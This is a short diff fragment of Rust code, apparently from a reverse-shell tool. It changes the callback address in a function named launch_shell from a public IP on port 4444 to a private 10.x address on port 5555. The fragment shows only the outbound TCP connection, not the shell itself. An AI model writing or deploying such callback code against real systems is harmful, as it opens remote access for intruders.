@@ -61,7 +61,7 @@ impl EncryptedStream {
 }
 
 pub async fn launch_shell() -> io::Result<()> {
-    let sock = TcpStream::connect("54.38.32.174:4444")?;
+    let sock = TcpStream::connect("10.0.50.20:5555")?;
 
     #[cfg(unix)]
     {
